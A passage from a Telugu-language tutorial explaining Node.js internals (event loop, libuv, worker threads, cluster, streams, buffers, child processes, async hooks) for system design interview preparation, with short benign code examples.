3. **Poll Phase:** సర్వర్ కి వచ్చిన కొత్త కనెక్షన్లు, డేటా రిక్వెస్టులను ఇక్కడ తీసుకుంటుంది.
4. **Check Phase:** `setImmediate()` ద్వారా రన్ చేయాల్సిన ఫంక్షన్లు ఇక్కడ ఉంటాయి.
5. **Close Callbacks:** ఏదైనా కనెక్షన్ క్లోజ్ అయినప్పుడు (ఉదా: `socket.on('close')`) ఈ దశలో ప్రాసెస్ అవుతాయి.

### ఎందుకు అంత ముఖ్యం?

సాధారణంగా ఒక సర్వర్ డేటాబేస్ నుండి డేటా కోసం ఎదురుచూస్తుంటే, వేరే రిక్వెస్టులను పట్టించుకోదు. కానీ Node.js లో **Event Loop** ఆ రిక్వెస్ట్‌ని పక్కన పెట్టి, సర్వర్ ఎప్పుడూ బిజీగా (Busy) ఉండేలా చూస్తుంది. దీనివల్ల "Non-blocking I/O" సాధ్యమవుతుంది.

---

**చిన్న ఉదాహరణ:**
మీరు ఒక రెస్టారెంట్‌లో వెయిటర్ లాగా దీన్ని ఊహించుకోండి. వెయిటర్ ఒక టేబుల్ నుండి ఆర్డర్ తీసుకుని, వంటగదికి పంపిస్తాడు. ఆ వంట కోసం వెయిటర్ వంటగది దగ్గరే నిలబడడు; వెంటనే మరో టేబుల్ దగ్గరకు వెళ్లి ఆర్డర్ తీసుకుంటాడు. వంట పూర్తయ్యాక మాత్రమే సర్వ్ చేస్తాడు. ఇక్కడ వెయిటరే **Event Loop**.

---

## libuv

Node.js అంత వేగంగా పనిచేయడానికి వెనుక ఉన్న అసలు రహస్యం **libuv** అనే లైబ్రరీ. దీని గురించి సులభంగా అర్థం చేసుకుందాం.

### Libuv అంటే ఏమిటి?

Node.js అనేది JavaScript ఇంజిన్ (V8) మీద నడుస్తుంది, కానీ కేవలం V8 తో మనం ఫైల్స్ చదవడం, నెట్‌వర్క్ కాల్స్ చేయడం వంటి పనులు చేయలేము. ఆ పనులన్నీ చేయడానికి **libuv** అనే C++ లైబ్రరీని Node.js వాడుకుంటుంది. ఇది ఒక **"Multi-platform support library"**.

దీని ముఖ్య ఉద్దేశ్యం: **Asynchronous, Non-blocking I/O** ని హ్యాండిల్ చేయడం.

---

### Libuv ఎలా పనిచేస్తుంది? (Core Components)

libuv లో రెండు ప్రధానమైన భాగాలు ఉంటాయి:

#### 1. Event Loop (ఈవెంట్ లూప్)

ఇది Node.js లోని "మెదడు" లాంటిది.

- ఇది ఒక లూప్ లాగా నిరంతరం తిరుగుతూ ఉంటుంది.
- ఏదైనా ఆపరేషన్ (Network request, File reading) జరిగినప్పుడు, అది పూర్తయ్యే వరకు వేచి ఉండకుండా, ఆ పనిని పక్కన పెట్టి తర్వాతి పనికి వెళ్తుంది.
- ఆ పని పూర్తయిన తర్వాత, దానికి సంబంధించిన `Callback` ఫంక్షన్‌ను తిరిగి మెయిన్ థ్రెడ్‌కు పంపుతుంది.

#### 2. Thread Pool (థ్రెడ్ పూల్)

Node.js సింగిల్-థ్రెడెడ్ అని మనకు తెలుసు. కానీ, కొన్ని పనులు (ఉదా: ఫైల్ సిస్టమ్ ఆపరేషన్స్, క్రిప్టోగ్రఫీ, కంప్రెషన్) చాలా సమయం తీసుకుంటాయి. ఇవి మెయిన్ థ్రెడ్‌ని ఆపకుండా (block చేయకుండా) ఉండటానికి libuv ఒక **Thread Pool** ని ఉపయోగిస్తుంది.

- డిఫాల్ట్‌గా ఇందులో **4 థ్రెడ్లు** ఉంటాయి.
- మీరు ఫైల్ చదవమన్నప్పుడు, మెయిన్ థ్రెడ్ ఆ పనిని ఈ పూల్‌లోని ఒక థ్రెడ్‌కు అప్పగిస్తుంది. అది పూర్తి చేసి రిజల్ట్ ఇస్తుంది. దీనివల్ల మన మెయిన్ కోడ్ ఎప్పుడూ ఖాళీగా ఉంటుంది.

---

### సిస్టమ్ డిజైన్ కోణంలో ఎందుకు ముఖ్యం?

మీరు సిస్టమ్ డిజైన్ ఇంటర్వ్యూలో వీటిని గుర్తుంచుకోవాలి:

- **I/O Bound Tasks:** మీ అప్లికేషన్ ఎక్కువగా నెట్‌వర్క్ కాల్స్ లేదా డేటాబేస్ ఆపరేషన్స్ (I/O Bound) చేస్తున్నప్పుడు Node.js బెస్ట్ ఛాయిస్. ఎందుకంటే libuv ఈ ఆపరేషన్లను చాలా సమర్థవంతంగా హ్యాండిల్ చేస్తుంది.
- **CPU Intensive Tasks:** ఒకవేళ మీ అప్లికేషన్ భారీగా మ్యాథమెటికల్ కాలిక్యులేషన్స్ (CPU Intensive - ఉదా: Image Processing, Video Encoding) చేస్తుంటే, libuv లోని Thread Pool త్వరగా నిండిపోతుంది (Exhaust అవుతుంది). దీనివల్ల అప్లికేషన్ నెమ్మదిస్తుంది.
- **పరిష్కారం:** ఇలాంటి పనుల కోసం `Worker Threads` వాడాలి లేదా ఆ పనులను వేరే మైక్రోసర్వీస్‌కు తరలించాలి.

---

### క్లుప్తంగా చెప్పాలంటే:

- **V8:** JavaScript కోడ్‌ని అమలు చేస్తుంది.
- **libuv:** ఆపరేటింగ్ సిస్టమ్‌తో సంభాషించి, ఫైల్స్, నెట్‌వర్క్, టైమర్స్ మరియు థ్రెడ్ మేనేజ్‌మెంట్ చూసుకుంటుంది.

---

## Worker Threads

Node.js లో CPU-intensive పనుల గురించి మనం మాట్లాడుకున్నాం కదా, వాటిని హ్యాండిల్ చేయడానికి ఉన్న బెస్ట్ సొల్యూషన్ **Worker Threads**. దీని గురించి వివరంగా తెలుసుకుందాం.

### Worker Threads అంటే ఏమిటి?

Node.js డిఫాల్ట్‌గా **Single-threaded** అని మనకు తెలుసు. అంటే, ఒక పెద్ద కాలిక్యులేషన్ (ఉదా: Video encoding, Image processing, Complex data parsing) మెయిన్ థ్రెడ్‌లో చేస్తే, ఆ పని పూర్తయ్యే వరకు వేరే ఏ రిక్వెస్ట్ (API calls) కూడా సర్వర్ ప్రాసెస్ చేయలేదు. దీనివల్ల అప్లికేషన్ "Hang" అవుతుంది.

**Worker Threads** ద్వారా, మనం ఒకే ప్రాసెస్‌లో వేర్వేరు థ్రెడ్లను సృష్టించి, భారీ పనులను వాటికి అప్పగించవచ్చు.

---

### ఇది ఎలా పనిచేస్తుంది?

- **Main Thread:** ఇది యూజర్ రిక్వెస్ట్‌లను తీసుకుంటుంది. భారీ పని ఏదైనా వచ్చినప్పుడు, అది వెంటనే ఒక "Worker" ని క్రియేట్ చేసి, ఆ పనిని దానికి అప్పగిస్తుంది.
- **Worker Thread:** ఇది తన సొంత పనిని చేసుకుంటుంది. మెయిన్ థ్రెడ్ వేచి ఉండాల్సిన అవసరం లేదు. పని పూర్తయ్యాక, వర్కర్ రిజల్ట్‌ను మెయిన్ థ్రెడ్‌కు పంపుతాడు.

### సిస్టమ్ డిజైన్‌లో ఎప్పుడు వాడాలి?

మీరు ఇంటర్వ్యూలో వీటిని తప్పకుండా ప్రస్తావించండి:

1. **CPU Intensive Tasks:** భారీ లెక్కలు, భారీ డేటాను ఫిల్టర్ చేయడం, Cryptography, Compression వంటి పనులు.
2. **I/O Bound కాదు:** ఇక్కడ గుర్తుంచుకోవాల్సిన ముఖ్య విషయం ఏంటంటే, **I/O పనుల (Database, API calls) కోసం Worker Threads వాడకూడదు.** వాటి కోసం libuv ఆల్రెడీ చాలా ఫాస్ట్‌గా పనిచేస్తుంది.
3. **Performance:** సర్వర్ ఒకేసారి చాలా మంది యూజర్లకు రెస్పాన్స్ ఇవ్వాలి అంటే, మెయిన్ థ్రెడ్‌ని ఎప్పుడూ ఖాళీగా ఉంచాలి. అందుకోసమే భారీ పనులను Worker Threads కి తరలించాలి.

---

### కోడ్ ఉదాహరణ (క్లుప్తంగా):

```javascript
const { Worker } = require("worker_threads");

function runHeavyTask(data) {
  return new Promise((resolve, reject) => {
    // కొత్త వర్కర్ ని క్రియేట్ చేయడం
    const worker = new Worker("./heavyTask.js", { workerData: data });
    worker.on("message", resolve); // రిజల్ట్ రాగానే మెయిన్ థ్రెడ్‌కి పంపుతుంది
    worker.on("error", reject);
  });
}
```

### ఇంటర్వ్యూ చిట్కా (Pro Tip):

సిస్టమ్ డిజైన్ ఇంటర్వ్యూలో ఎవరైనా "మీ Node.js అప్లికేషన్ స్లో అవుతోంది, CPU వాడకం 100% కి వెళ్తోంది, ఏం చేస్తారు?" అని అడిగితే, మీరు ఇలా సమాధానం చెప్పాలి:

> "నేను ముందుగా ఆ పర్ఫార్మెన్స్ సమస్య ఎక్కడ ఉందో చూస్తాను. అది CPU-intensive టాస్క్ అయితే, **Worker Threads** ని ఉపయోగించి ఆ టాస్క్‌ని మెయిన్ ఈవెంట్ లూప్ నుండి వేరు చేస్తాను. ఒకవేళ అది చాలా ఎక్కువ లోడ్ అయితే, నేను ఆ పర్టికులర్ ఫంక్షనాలిటీని ఒక **Microservice** లాగా విడగొట్టి, వేరే సర్వర్‌కి తరలిస్తాను."

---

## Cluster

Node.js లో **Cluster Module** అనేది **Horizontal Scaling** (ఒకటి కంటే ఎక్కువ సర్వర్లను వాడటం) చేయడానికి ఉపయోగించే ఒక అద్భుతమైన ఫీచర్. Worker Threads ఒకే సర్వర్ లోపల CPU పవర్ పెంచడానికి వాడితే, Cluster Module ద్వారా మనం ఒకే మెషీన్‌లో Node.js యొక్క **Multiple Instances**ని నడపవచ్చు.

దీని గురించి వివరంగా చూద్దాం:

### Cluster ఎందుకు అవసరం?

Node.js సింగిల్-థ్రెడ్ కావడం వల్ల, అది ఒకేసారి ఒక CPU కోర్ (Core) ని మాత్రమే వాడుకోగలదు. ఒకవేళ మీ సర్వర్‌లో 8 కోర్లు ఉన్నా, Node.js డిఫాల్ట్‌గా ఒకటే వాడి, మిగిలిన 7 ఖాళీగా ఉంటాయి. **Cluster Module** ఈ 8 కోర్లను సమర్థవంతంగా వాడుకోవడానికి సహాయపడుతుంది.

### ఇది ఎలా పనిచేస్తుంది?

- **Master Process:** ఇది సర్వర్‌ని స్టార్ట్ చేస్తుంది మరియు లోడ్ బ్యాలెన్సర్ లాగా పనిచేస్తుంది. ఇది ట్రాఫిక్‌ను తీసుకోవడం, వాటిని "Workers" కి పంపడం చేస్తుంది.
- **Worker Processes:** ఇవి యాక్చువల్ అప్లికేషన్ కోడ్‌ని రన్ చేస్తాయి. ఇవి ప్రతి ఒక్కటి ఒక ప్రత్యేకమైన ప్రాసెస్.
- **Shared Port:** ఇవన్నీ ఒకే పోర్ట్ (ఉదా: 8080) ని షేర్ చేసుకుంటాయి. మాస్టర్ ప్రాసెస్ ట్రాఫిక్‌ను ఈ వర్కర్లకు సమానంగా పంపిణీ చేస్తుంది.

---

### సిస్టమ్ డిజైన్ దృక్కోణంలో ముఖ్యమైన పాయింట్లు:

1. **Scalability:** ఒకే మెషీన్‌పై ఉన్న అన్ని CPU కోర్లను వాడుకోవడానికి ఇది ఉత్తమమైన మార్గం.
2. **High Availability:** ఏదైనా ఒక వర్కర్ ప్రాసెస్ క్రాష్ అయినా, మాస్టర్ ప్రాసెస్ దాన్ని వెంటనే గుర్తించి, కొత్త వర్కర్‌ని స్టార్ట్ చేయగలదు. దీనివల్ల సర్వర్ ఆగిపోదు.
3. **Memory Isolation:** Worker Threads లో మెమరీ షేర్ అవుతుంది, కానీ **Cluster లో ప్రతి వర్కర్ కి సొంత మెమరీ ఉంటుంది**. దీనివల్ల ఒక వర్కర్ వల్ల మెమరీ లీక్ అయినా, అది వేరే వర్కర్లను ప్రభావితం చేయదు.

---

### ఎలా వాడాలి (సింపుల్ లాజిక్)?

```javascript
const cluster = require("cluster");
const os = require("os");

if (cluster.isMaster) {
  // CPU కోర్ల సంఖ్యను బట్టి వర్కర్లను క్రియేట్ చేయడం
  const numCPUs = os.cpus().length;
  for (let i = 0; i < numCPUs; i++) {
    cluster.fork();
  }
} else {
  // ఇక్కడ మీ మెయిన్ సర్వర్ కోడ్ ఉంటుంది
  const http = require("http");
  http
    .createServer((req, res) => {
      res.end("Hello from Worker " + process.pid);
    })
    .listen(8000);
}
```

---

### ఇంటర్వ్యూలో గుర్తుంచుకోవాల్సిన చిట్కా (Comparison):

| ఫీచర్           | Worker Threads                     | Cluster                                            |
| --------------- | ---------------------------------- | -------------------------------------------------- |
| **ఉద్దేశ్యం**   | CPU-intensive పనులు (Calculations) | ఎక్కువ రిక్వెస్టులను హ్యాండిల్ చేయడం (Scalability) |
| **మెమరీ**       | షేర్డ్ మెమరీ (Shared Memory)       | సపరేట్ మెమరీ (Separate Memory)                     |
| **మెయిన్ రోల్** | ఒకే ప్రాసెస్‌లో మల్టీ-థ్రెడింగ్    | ఒకే మెషీన్‌లో మల్టీ-ప్రాసెసింగ్                    |

**ఇంటర్వ్యూయర్ ఇలా అడగొచ్చు:** "మీ సర్వర్ లోడ్ పెరిగినప్పుడు ఏం చేస్తారు?"
**మీ సమాధానం:** "నేను మొదట **Cluster Module** వాడి అన్ని CPU కోర్లను వాడుకుంటాను. ఒకవేళ ఇంకా ట్రాఫిక్ పెరిగితే, అప్పుడు **Load Balancer (Nginx/AWS ELB)** వాడి వేర్వేరు మెషీన్ల (Multiple Servers) మీదకి ట్రాఫిక్‌ను మళ్ళిస్తాను (Horizontal Scaling)."

---

## Streams

Node.js లో **Streams** అనేది చాలా కీలకమైన కాన్సెప్ట్. ముఖ్యంగా పెద్ద మొత్తంలో డేటాను హ్యాండిల్ చేస్తున్నప్పుడు ఇది ప్రాణం లాంటిది. సిస్టమ్ డిజైన్ పరంగా Streams ఎందుకు ముఖ్యమో ఇప్పుడు చూద్దాం.

### Streams అంటే ఏమిటి?

సాధారణంగా ఏదైనా ఫైల్ చదవాలన్నా లేదా డేటాబేస్ నుండి డేటా పొందాలన్నా, మనం మొత్తం డేటాను ఒకేసారి మెమరీలోకి (RAM) లోడ్ చేస్తాము. కానీ డేటా చాలా పెద్దగా ఉంటే (ఉదా: 5GB ఫైల్), మన అప్లికేషన్ క్రాష్ అవ్వొచ్చు.

**Streams** ఏం చేస్తాయంటే:

- డేటాను ఒకేసారి కాకుండా, చిన్న చిన్న ముక్కలుగా (chunks) చదువుతాయి.
- ఒక ముక్క (chunk) ప్రాసెస్ అవ్వగానే, దాన్ని మెమరీ నుండి తీసేసి, తర్వాతి ముక్కను తీసుకుంటాయి.

---

### Streams రకాలు:

1. **Readable Streams:** డేటాను చదవడానికి (ఉదా: `fs.createReadStream`).
2. **Writable Streams:** డేటాను రాయడానికి (ఉదా: `fs.createWriteStream`).
3. **Duplex Streams:** చదవడానికి మరియు రాయడానికి రెండింటికీ ఉపయోగపడుతుంది (ఉదా: `net.Socket`).
4. **Transform Streams:** డేటాను చదివేటప్పుడు దాన్ని మార్చడానికి (ఉదా: `zlib` గన్‌జిప్ కంప్రెషన్).

---

### సిస్టమ్ డిజైన్ ఇంటర్వ్యూలో Streams యొక్క ప్రాముఖ్యత:

#### 1. మెమరీ ఎఫిషియన్సీ (Memory Efficiency):

ఒక పెద్ద వీడియో ఫైల్‌ను యూజర్‌కు పంపాల్సి వచ్చినప్పుడు, మీరు `fs.readFile` వాడితే సర్వర్ మెమరీ మొత్తం నిండిపోతుంది. అదే **Streams** వాడితే, ఫైల్ చిన్న ముక్కలుగా నెట్‌వర్క్ ద్వారా వెళ్తుంది. దీనివల్ల చాలా తక్కువ RAM సరిపోతుంది.

#### 2. పైపింగ్ (Piping):

Streams లో `pipe()` అనే పద్ధతి చాలా పవర్‌ఫుల్.

> `readableStream.pipe(transformStream).pipe(writableStream)`
> ఉదాహరణకు: ఒక ఫైల్‌ను చదివి, దాన్ని కంప్రెస్ చేసి, వెంటనే సర్వర్‌కు పంపడం చాలా సులభం అవుతుంది.

#### 3. బ్యాక్-ప్రెజర్ (Back-pressure) హ్యాండ్లింగ్:

ఇది చాలా ముఖ్యమైన ఇంటర్వ్యూ పాయింట్. ఒకవేళ డేటాను రీడ్ చేసే వేగం, రైట్ చేసే వేగం కంటే ఎక్కువగా ఉంటే, బఫర్ నిండిపోతుంది. Streams ఈ సమస్యను **Back-pressure** ద్వారా ఆటోమేటిక్‌గా హ్యాండిల్ చేస్తాయి.

---

### ఒక చిన్న ఉదాహరణ (Code Concept):

```javascript
const fs = require("fs");

// బదులుగా 'fs.readFile' వాడకుండా, Stream వాడతాము
const readStream = fs.createReadStream("large_file.txt");
const writeStream = fs.createWriteStream("new_file.txt");

// Stream ద్వారా డేటాను పైపింగ్ చేయడం
readStream.pipe(writeStream);
```

### ఇంటర్వ్యూయర్ కి చెప్పాల్సిన సమాధానం:

"నేను ఎప్పుడూ లార్జ్ డేటాను హ్యాండిల్ చేసేటప్పుడు Streams వాడతాను. దీనివల్ల **RAM వినియోగం (Memory footprint)** తక్కువగా ఉంటుంది, సిస్టమ్ పర్ఫార్మెన్స్ పెరుగుతుంది. ఉదాహరణకు: ఫైల్ అప్‌లోడ్స్, లాగ్స్ ప్రాసెసింగ్, లేదా వీడియో స్ట్రీమింగ్ వంటి సినారియోలలో Streams తప్పనిసరి."

---

**ముగింపు (Summary):**
మీకు ఇప్పుడు Node.js లోని **Event Loop, Libuv, Worker Threads, Cluster,** మరియు **Streams** గురించి ఒక మంచి అవగాహన వచ్చింది. ఈ 5 అంశాలు Node.js Backend System Design కి పునాదులు.

---

## Buffers

Node.js లో **Buffer** అనేది చాలా ముఖ్యమైన కాన్సెప్ట్, ముఖ్యంగా మనం బైనరీ డేటాతో (Binary Data) పనిచేసేటప్పుడు ఇది చాలా అవసరం. Streams గురించి మాట్లాడుకున్నాం కదా, ఆ స్ట్రీమ్స్‌లో డేటా ప్రవహించేది ఈ Buffer రూపంలోనే.

### Buffer అంటే ఏమిటి?

సాధారణంగా JavaScript లో `String` (టెక్స్ట్) డేటాను హ్యాండిల్ చేయడం సులభం. కానీ, ఫైల్స్, ఇమేజెస్, లేదా నెట్‌వర్క్ ప్యాకెట్స్ వంటివి బైనరీ డేటా (0s and 1s) లో ఉంటాయి. V8 JavaScript ఇంజిన్ కి బైనరీ డేటాను నేరుగా అర్థం చేసుకోవడం కష్టం. అందుకే Node.js, V8 మెమరీకి వెలుపల (outside V8 heap) ఒక మెమరీ ఏరియాను కేటాయించి, అందులో ఈ బైనరీ డేటాను దాచుకుంటుంది. దాన్నే **Buffer** అంటాం.

**క్లుప్తంగా:** Buffer అనేది RAM లో ఒక ముక్క, ఇది రా (raw) బైనరీ డేటాను దాచుకోవడానికి వాడతారు.

---

### Buffer ఎందుకు అవసరం? (System Design Perspective)

1. **Binary Data Handling:** మీరు ఏదైనా ఇమేజ్ ప్రాసెసింగ్, వీడియో స్ట్రీమింగ్, లేదా ఫైల్ రీడ్/రైట్ చేస్తున్నప్పుడు, ఆ డేటా అంతా బఫర్స్ రూపంలోనే ట్రాన్స్‌ఫర్ అవుతుంది.
2. **Performance:** ఇది RAM లోని ఒక నిర్దిష్టమైన (Fixed) సైజు మెమరీని వాడుకుంటుంది. ఇది చాలా వేగంగా పనిచేస్తుంది ఎందుకంటే ఇది V8 గార్బేజ్ కలెక్టర్ (Garbage Collector) పర్యవేక్షణలో ఉండదు (ఎక్కువగా).
3. **Streams తో అనుసంధానం:** ప్రతి `Readable Stream` లో డేటా 'chunks' గా వస్తుంది. ఆ chunks అన్నీ `Buffer` ఆబ్జెక్టులే.

---

### ఇంటర్వ్యూలో గుర్తుంచుకోవాల్సిన కీలక విషయాలు:

- **Fixed Size:** బఫర్ ని క్రియేట్ చేసేటప్పుడే దాని సైజు చెప్పాలి. ఒకసారి క్రియేట్ చేశాక దాని సైజును మార్చలేము.
- **Strings vs Buffers:** String అనేది టెక్స్ట్, Buffer అనేది రా డేటా. String నుండి Buffer కి లేదా Buffer నుండి String కి మార్చడానికి "Encoding" (ఉదా: utf-8, base64, hex) వాడతాము.

---

### కోడ్ ఉదాహరణ:

```javascript
// ఒక బఫర్ ని క్రియేట్ చేయడం
const buf = Buffer.alloc(10); // 10 bytes మెమరీని అలొకేట్ చేస్తుంది
buf.write("Hello"); // ఇందులో డేటాను రాయడం

console.log(buf);
// Output: <Buffer 48 65 6c 6c 6f 00 00 00 00 00> (ఇది హెక్సాడెసిమల్ ఫార్మాట్)

console.log(buf.toString());
// Output: 'Hello'
```

---

### సిస్టమ్ డిజైన్ టిప్స్:

- **Memory Management:** సిస్టమ్ డిజైన్ ఇంటర్వ్యూలో మీరు "ఎక్కువ డేటాను ఒకేసారి బఫర్‌లో లోడ్ చేయకండి" అని చెప్పాలి. ఎందుకంటే, ఒకవేళ మీరు మరీ పెద్ద సైజులో బఫర్స్ క్రియేట్ చేస్తే, **Memory Usage** విపరీతంగా పెరిగిపోయి మీ సర్వర్ క్రాష్ అయ్యే అవకాశం ఉంది (దీన్నే Memory Leak అంటారు).
- **Buffer.allocUnsafe():** ఇది పర్ఫార్మెన్స్ కోసం వాడతారు, కానీ ఇది పాత డేటాను క్లియర్ చేయదు. కాబట్టి సెక్యూరిటీ అవసరమైన చోట `Buffer.alloc()` వాడమని చెప్పండి.

**ఒక ముఖ్యమైన పాయింట్:** Node.js యొక్క లేటెస్ట్ వెర్షన్లలో `TypedArray` (Uint8Array) ని ఎక్కువగా వాడుతున్నారు, ఇది ఇప్పుడు `Buffer` తో సమానంగా పనిచేస్తుంది.

---

## Child Processes

Node.js లో **Child Processes** గురించి తెలుసుకోవడం చాలా ముఖ్యం. ఇది **Cluster** మరియు **Worker Threads** లాగే మరో ముఖ్యమైన కాన్సెప్ట్. వీటి మధ్య తేడాలు తెలిస్తే ఇంటర్వ్యూలో మీరు చాలా క్లారిటీగా సమాధానం చెప్పగలరు.

### Child Processes అంటే ఏమిటి?

Node.js అనేది సింగిల్-థ్రెడెడ్ అని మనం చెప్పుకున్నాం. కొన్నిసార్లు మనం ఆపరేటింగ్ సిస్టమ్ లెవల్‌లో వేరే ప్రోగ్రామ్‌లను (ఉదా: Python script, Shell commands, C++ binary) రన్ చేయాల్సి వస్తుంది. అప్పుడు మనం **`child_process`** అనే మాడ్యూల్‌ను వాడతాము.

ఇది ఒక కొత్త OS ప్రాసెస్‌ను సృష్టిస్తుంది, ఇది మన మెయిన్ Node.js ప్రాసెస్ నుండి పూర్తిగా వేరుగా ఉంటుంది.

---

### ఎలా క్రియేట్ చేస్తారు? (4 Methods)

`child_process` మాడ్యూల్‌లో నాలుగు ముఖ్యమైన పద్ధతులు ఉన్నాయి:

1. **`spawn()`:** ఇది ఒక పెద్ద డేటా స్ట్రీమ్ ఉన్నప్పుడు వాడతారు. ఒక కమాండ్‌ను రన్ చేసి, దాని అవుట్‌పుట్‌ను స్ట్రీమ్ రూపంలో తీసుకోవడానికి ఇది బెస్ట్.
2. **`exec()`:** ఇది ఒక కమాండ్‌ను రన్ చేసి, మొత్తం అవుట్‌పుట్‌ను ఒకేసారి బఫర్‌లో స్టోర్ చేస్తుంది. చిన్న కమాండ్స్ రన్ చేయడానికి ఇది సులభం.
3. **`fork()`:** ఇది **Child Process** యొక్క స్పెషల్ వెర్షన్. ఇది కేవలం Node.js ఫైళ్లను రన్ చేయడానికి మాత్రమే వాడతారు. ఇది మెయిన్ ప్రాసెస్‌తో కమ్యూనికేషన్ చేయడానికి (IPC - Inter-Process Communication) ఒక ప్రత్యేకమైన ఛానెల్‌ను క్రియేట్ చేస్తుంది.
4. **`execFile()`:** ఇది కమాండ్ కాకుండా నేరుగా ఒక executable ఫైల్‌ను రన్ చేస్తుంది.

---

### ఎప్పుడు వాడాలి? (Use Cases)

- **OS Tasks:** ఫైల్ సిస్టమ్ ఆపరేషన్స్ లేదా షెల్ స్క్రిప్ట్‌లను రన్ చేయడానికి.
- **External Services:** మీ Node.js యాప్ నుండి ఒక Python ML మోడల్ లేదా వేరే లాంగ్వేజ్ ప్రోగ్రామ్‌ను కాల్ చేయడానికి.
- **CPU Tasks:** Worker Threads లాగే, భారీ పనులను వేరే ప్రాసెస్‌కు పంపడానికి. అయితే, Worker Threads కంటే Child Processes ఎక్కువ మెమరీ తీసుకుంటాయి (ఎందుకంటే ప్రతి ప్రాసెస్‌కి సొంత V8 ఇన్స్టాన్స్ ఉంటుంది).

---

### క్లిష్టమైన తేడాలు (Important for Interviews)

| ఫీచర్              | Worker Threads                               | Child Processes                                  |
| ------------------ | -------------------------------------------- | ------------------------------------------------ |
| **మెమరీ**          | మెయిన్ ప్రాసెస్‌తో మెమరీని షేర్ చేసుకుంటాయి. | ప్రతి ప్రాసెస్‌కి సొంత మెమరీ ఉంటుంది.            |
| **బరువు (Weight)** | తేలికైనవి (Lightweight).                     | బరువైనవి (Heavyweight).                          |
| **కమ్యూనికేషన్**   | వేగంగా ఉంటుంది (Shared memory).              | కొంచెం స్లో (IPC channel అవసరం).                 |
| **ఉద్దేశ్యం**      | CPU-intensive పనులు.                         | OS పనులు, వేరే లాంగ్వేజ్ స్క్రిప్ట్స్ రన్ చేయడం. |

---

### ఇంటర్వ్యూ చిట్కా (Pro Tip):

ఇంటర్వ్యూయర్ "ఎప్పుడు Worker Thread వాడాలి? ఎప్పుడు Child Process వాడాలి?" అని అడిగితే, మీరు ఇలా చెప్పండి:

> "నేను CPU-intensive పనుల కోసం మరియు మెమరీని సమర్థవంతంగా వాడుకోవడానికి **Worker Threads** కి ప్రాధాన్యత ఇస్తాను. కానీ, నా అప్లికేషన్ ఒక ఎక్స్‌టర్నల్ స్క్రిప్ట్‌ను (ఉదా: Python, Shell) రన్ చేయాల్సి వచ్చినప్పుడు లేదా మెమరీ ఐసోలేషన్ (Memory Isolation) చాలా కచ్చితంగా ఉండాలి అనుకున్నప్పుడు **Child Processes** ని ఎంచుకుంటాను."

---

## Async Hooks

**Async Hooks** అనేది Node.js లో ఉన్న ఒక అడ్వాన్స్‌డ్ API. ఇది అప్లికేషన్ యొక్క **Asynchronous life-cycle**ని ట్రాక్ చేయడానికి ఉపయోగపడుతుంది. సాధారణంగా మనకు కోడ్ ఎలా నడుస్తుందో తెలుసు, కానీ బ్యాక్‌గ్రౌండ్‌లో Asynchronous పనులు (Callbacks, Promises) ఎప్పుడు మొదలవుతున్నాయి, ఎప్పుడు పూర్తవుతున్నాయి అనేది తెలుసుకోవడానికి ఇది వాడతారు.

### Async Hooks అంటే ఏమిటి?

Node.js లో ఏదైనా Async ఆపరేషన్ జరిగినప్పుడు (ఉదా: `setTimeout`, `fs.readFile`, `Promise`), అది ఒక **"Async Resource"** ని క్రియేట్ చేస్తుంది. ఈ रिसورس లైఫ్-సైకిల్ లోని వివిధ దశలను (Init, Before, After, Destroy) పర్యవేక్షించడానికి `async_hooks` మాడ్యూల్ మనకు సహాయపడుతుంది.

### దీనిలోని ముఖ్యమైన దశలు (Lifecycle Hooks):

1. **init:** ఒక Async రిసోర్స్ క్రియేట్ అయినప్పుడు.
2. **before:** ఆ రిసోర్స్ (callback) అమలు కావడానికి ముందు.
3. **after:** ఆ రిసోర్స్ అమలు పూర్తయ్యాక.
4. **destroy:** ఆ రిసోర్స్ పూర్తిగా క్లోజ్ అయినప్పుడు.

---

### సిస్టమ్ డిజైన్ మరియు అప్లికేషన్‌లో దీని వాడకం:

సిస్టమ్ డిజైన్ ఇంటర్వ్యూలో మీరు దీని గురించి అడిగితే, ఇది **Monitoring, Debugging, మరియు Tracing** కోసం వాడతామని చెప్పాలి.

1. **Distributed Tracing:** మైక్రోసర్వీసెస్ ఆర్కిటెక్చర్‌లో, ఒక రిక్వెస్ట్ ఒక సర్వీస్ నుండి ఇంకో సర్వీస్‌కు వెళ్తున్నప్పుడు, ఆ రిక్వెస్ట్ యొక్క 'Trace ID'ని ట్రాక్ చేయడానికి Async Hooks వాడతారు.
2. **Context Management:** `AsyncLocalStorage` అనే క్లాస్ Async Hooks మీద ఆధారపడి పనిచేస్తుంది. ఇది ఒకే రిక్వెస్ట్ ఫ్లోలో ఉన్న డేటాను (ఉదా: Request ID లేదా User Session) అన్ని ఫంక్షన్లలోకి పాస్ చేయడానికి (Prop drilling లేకుండా) వాడతారు.
3. **Resource Leak Detection:** ఏదైనా డేటాబేస్ కనెక్షన్ లేదా ఫైల్ హ్యాండిల్ ఓపెన్ అయ్యి, అది `destroy` అవ్వకుండా అలాగే ఉండిపోతే (Memory Leak), దాన్ని గుర్తించడానికి ఇది ఉపయోగపడుతుంది.

---

### చిన్న కోడ్ ఉదాహరణ:

```javascript
const async_hooks = require("async_hooks");

// ఒక హుక్ క్రియేట్ చేయడం
const hook = async_hooks.createHook({
  init(asyncId, type, triggerAsyncId) {
    console.log(`Resource created: ${type} (ID: ${asyncId})`);
  },
  destroy(asyncId) {
    console.log(`Resource destroyed: ${asyncId}`);
  },
});

hook.enable();

// ఒక చిన్న Async పని
setTimeout(() => {
  console.log("Inside Timeout");
}, 1000);
```

---

### ఇంటర్వ్యూలో గుర్తుంచుకోవాల్సిన ముఖ్యమైన పాయింట్లు:

- **Performance Impact:** Async Hooks ప్రతి Async ఆపరేషన్ మీద పనిచేస్తుంది కాబట్టి, దీన్ని ఎక్కువగా వాడితే అప్లికేషన్ **Performance** తగ్గే అవకాశం ఉంది. అందుకే ప్రొడక్షన్‌లో వాడేటప్పుడు చాలా జాగ్రత్తగా ఉండాలి.
- **AsyncLocalStorage:** ఆధునిక Node.js అప్లికేషన్లలో డైరెక్ట్ గా `async_hooks` వాడటం కంటే, `AsyncLocalStorage` వాడటం ఉత్తమం. ఇది చాలా సురక్షితమైన మరియు సులభమైన మార్గం.

---

## EventEmitter

Node.js లోని **`EventEmitter`** అనేది అప్లికేషన్‌లోని వివిధ భాగాల మధ్య కమ్యూనికేషన్ జరుపుకోవడానికి వాడే ఒక ముఖ్యమైన డిజైన్ ప్యాటర్న్ (Observer Pattern). ఇది Node.js కోర్ ఆర్కిటెక్చర్‌లో అంతర్భాగం.

### EventEmitter అంటే ఏమిటి?

